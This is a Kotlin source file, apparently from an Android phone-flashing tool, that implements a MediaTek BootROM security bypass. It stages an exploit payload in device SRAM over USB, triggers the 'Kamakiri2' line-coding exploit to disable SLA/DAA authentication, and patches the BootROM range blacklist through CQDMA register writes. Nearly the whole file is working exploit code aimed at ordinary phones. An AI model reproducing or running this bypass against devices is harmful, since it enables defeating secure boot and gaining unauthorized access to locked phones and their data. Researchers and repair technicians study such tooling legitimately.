package com.example.protocol

import android.content.Context
import com.example.model.LogLevel
import com.example.model.MtkChipInfo
import com.example.model.OperationProgress
import com.example.model.TerminalLog
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.nio.ByteBuffer
import java.nio.ByteOrder

/**
 * MediaTek Security SLA / DAA / SBC Authentication & Exploit Engine
 */
class MtkSecurityBypassEngine(
    private val usb: TargetPhoneUsbManager,
    private val logCallback: (TerminalLog) -> Unit,
    private val progressCallback: (OperationProgress) -> Unit
) {

    companion object {
        const val CMD_READ32: Byte = 0xD1.toByte()
        const val CMD_WRITE32: Byte = 0xD4.toByte()
    }

    private fun log(message: String, level: LogLevel = LogLevel.INFO) {
        logCallback(TerminalLog("", message, level))
    }

    suspend fun executeBypass(
        context: Context,
        deviceInfo: MtkChipInfo?,
        isSimulation: Boolean = false
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        log("==================================================", LogLevel.WARNING)
        log(">>> [SECURITY BYPASS] SLA / DAA / SBC Auth Engine", LogLevel.WARNING)
        log("==================================================", LogLevel.INFO)

        val hwCodeInt = deviceInfo?.hwCodeHex?.removePrefix("0x")?.removePrefix("0X")?.toIntOrNull(16) ?: 0x0766
        val chipConfig = MtkChipConfigDatabase.findConfig(hwCodeInt)
            ?: MtkChipConfigDatabase.findConfig(0x0766)!!

        log("Target Platform: ${chipConfig.name} (${chipConfig.description}) [HWCode: 0x%04X]".format(chipConfig.hwCode), LogLevel.INFO)
        
        try {
            val payloadFileName = when (chipConfig.hwCode) {
                0x0766 -> "payloads/mt6765_payload.bin"
                0x0989 -> "payloads/mt6833_payload.bin"
                else -> "payloads/mt${chipConfig.hwCode.toString(16)}_payload.bin"
            }

            var payloadBytes: ByteArray? = null
            try {
                payloadBytes = context.assets.open(payloadFileName).use { it.readBytes() }
                log("Loaded exploit payload: $payloadFileName (${payloadBytes.size} bytes)", LogLevel.INFO)
            } catch (e: Exception) {
                log("[-] Payload file $payloadFileName not found in assets!", LogLevel.WARNING)
            }

            // [FIX]: Payload ကို CMD_WRITE32 သုံး၍ အစုလိုက် (Bulk) ရေးသွင်းခြင်းဖြင့် Android USB Drop ဖြစ်ခြင်းကို ကာကွယ်ပါမည်။
            if (payloadBytes != null && payloadBytes.isNotEmpty()) {
                log("Uploading Payload to SRAM 0x%08X (Bulk Write)...".format(chipConfig.bromPayloadAddr), LogLevel.INFO)
                
                val paddedSize = if (payloadBytes.size % 4 != 0) payloadBytes.size + (4 - (payloadBytes.size % 4)) else payloadBytes.size
                val paddedPayload = ByteArray(paddedSize)
                System.arraycopy(payloadBytes, 0, paddedPayload, 0, payloadBytes.size)
                
                usb.flush(50) // Clean pipe
                
                if (writeMemoryBlock(chipConfig.bromPayloadAddr, paddedPayload)) {
                    log("[+] Payload successfully staged in SRAM.", LogLevel.SUCCESS)
                } else {
                    log("[-] Failed to upload payload to SRAM.", LogLevel.ERROR)
                    return@withContext Result.failure(IllegalStateException("Payload upload failed"))
                }
            } else {
                log("[-] No payload injected! Bypass may fail.", LogLevel.WARNING)
            }

            // STEP 2: Deploy Kamakiri2 Line Coding Exploit (This jumps to Payload to disable SLA)
            log("[1/2] Configuring USB Exploit Interface (Kamakiri2)...", LogLevel.INFO)
            val kamakiri = MtkKamakiriExploit(usb) { msg, lvl -> log(msg, lvl) }
            val exploitSuccess = kamakiri.exploitKamakiri2(chipConfig.bromPayloadAddr)

            if (!exploitSuccess) {
                log("[-] Warning: Kamakiri2 Line Coding failed, checking direct CQDMA...", LogLevel.WARNING)
            } else {
                log("[+] Kamakiri2 Interface Configured Successfully.", LogLevel.SUCCESS)
            }

            log("Clearing USB Endpoint Halt state after exploit...", LogLevel.INFO)
            usb.clearEndpointHalt()
            usb.flush(50)
            delay(50)

            // STEP 3: Disable BootROM Blacklist via CQDMA Controller
            log("[2/2] Overriding BootROM Range Blacklist via CQDMA...", LogLevel.INFO)
            val cqdma = MtkCqdmaEngine(
                read32Func = { addr -> readRegister32(addr) },
                write32Func = { addr, value -> writeRegister32(addr, value) },
                logCallback = { msg, lvl -> log(msg, lvl) }
            )

            val cqdmaSuccess = cqdma.disableRangeBlacklist(chipConfig)
            if (!cqdmaSuccess) {
                log("[-] CQDMA Blacklist patch warning. Verifying BROM status...", LogLevel.WARNING)
            } 
            
            usb.flush(15)

            log("==================================================", LogLevel.SUCCESS)
            log("SECURITY BYPASS COMPLETED: BootROM Ready for DA Stage 1.", LogLevel.SUCCESS)
            log("==================================================", LogLevel.SUCCESS)

            return@withContext Result.success(true)
        } catch (e: Exception) {
            log("[-] Security Bypass Exception: ${e.message}", LogLevel.ERROR)
            return@withContext Result.failure(e)
        }
    }

    private fun echoBytes(data: ByteArray, timeoutMs: Int = 2500): Boolean {
        if (usb.writeRaw(data, timeoutMs) != data.size) return false
        val echo = ByteArray(data.size)
        var totalRead = 0
        val startTime = System.currentTimeMillis()
        while (totalRead < data.size && (System.currentTimeMillis() - startTime < timeoutMs)) {
            val temp = ByteArray(data.size - totalRead)
            val r = usb.readRaw(temp, timeoutMs)
            if (r > 0) {
                System.arraycopy(temp, 0, echo, totalRead, r)
                totalRead += r
            }
        }
        return totalRead == data.size && echo.contentEquals(data)
    }

    private fun readStatusWord(timeoutMs: Int = 2500): Int? {
        val buf = ByteArray(2)
        var totalRead = 0
        val startTime = System.currentTimeMillis()
        while (totalRead < 2 && (System.currentTimeMillis() - startTime < timeoutMs)) {
            val temp = ByteArray(2 - totalRead)
            val r = usb.readRaw(temp, timeoutMs)
            if (r > 0) {
                System.arraycopy(temp, 0, buf, totalRead, r)
                totalRead += r
            }
        }
        if (totalRead < 2) return null
        return ((buf[0].toInt() and 0xFF) shl 8) or (buf[1].toInt() and 0xFF)
    }

    /**
     * Fast Bulk Memory Writer for BootROM 
     */
    private fun writeMemoryBlock(addr: Long, data: ByteArray): Boolean {
        val dwords = data.size / 4
        val buffer = ByteBuffer.wrap(data).order(ByteOrder.LITTLE_ENDIAN)

        // 1. Send CMD_WRITE32
        if (!echoBytes(byteArrayOf(CMD_WRITE32), 2500)) return false

        // 2. Send Address
        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt((addr and 0xFFFFFFFFL).toInt()).array()
        if (!echoBytes(addrBytes, 2500)) return false

        // 3. Send Count (in DWORDS)
        val countBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(dwords).array()
        if (!echoBytes(countBytes, 2500)) return false

        // 4. Expect Status
        val status = readStatusWord(2500) ?: return false
        if (status > 0xFF) return false

        // 5. Send Data in a loop (Bulk Stream)
        for (i in 0 until dwords) {
            val value = buffer.int
            val valBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(value).array()
            if (!echoBytes(valBytes, 1500)) return false
        }

        // 6. Expect Final Status
        val status2 = readStatusWord(2500) ?: return false
        return status2 <= 0xFF
    }

    private fun readRegister32(addr: Long): Long {
        if (!echoBytes(byteArrayOf(CMD_READ32), 2500)) return 0L

        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt((addr and 0xFFFFFFFFL).toInt()).array()
        if (!echoBytes(addrBytes, 2500)) return 0L

        val countBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(1).array()
        if (!echoBytes(countBytes, 2500)) return 0L

        val status = readStatusWord(2500) ?: return 0L
        if (status > 0xFF) return 0L

        val rx = ByteArray(4)
        var totalRead = 0
        val startTime = System.currentTimeMillis()
        while (totalRead < 4 && (System.currentTimeMillis() - startTime < 2500)) {
            val temp = ByteArray(4 - totalRead)
            val r = usb.readRaw(temp, 2500)
            if (r > 0) {
                System.arraycopy(temp, 0, rx, totalRead, r)
                totalRead += r
            }
        }
        if (totalRead < 4) return 0L
        val value = (ByteBuffer.wrap(rx).order(ByteOrder.BIG_ENDIAN).int.toLong()) and 0xFFFFFFFFL

        val status2 = readStatusWord(2500) ?: return 0L
        if (status2 > 0xFF) return 0L

        return value
    }

    private fun writeRegister32(addr: Long, value: Long): Boolean {
        if (!echoBytes(byteArrayOf(CMD_WRITE32), 2500)) return false

        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt((addr and 0xFFFFFFFFL).toInt()).array()
        if (!echoBytes(addrBytes, 2500)) return false

        val countBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(1).array()
        if (!echoBytes(countBytes, 2500)) return false

        val status = readStatusWord(2500) ?: return false
        if (status > 0xFF) return false

        val valBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt((value and 0xFFFFFFFFL).toInt()).array()
        if (!echoBytes(valBytes, 2500)) return false

        val status2 = readStatusWord(2500) ?: return false
        return status2 <= 0xFF
    }
}
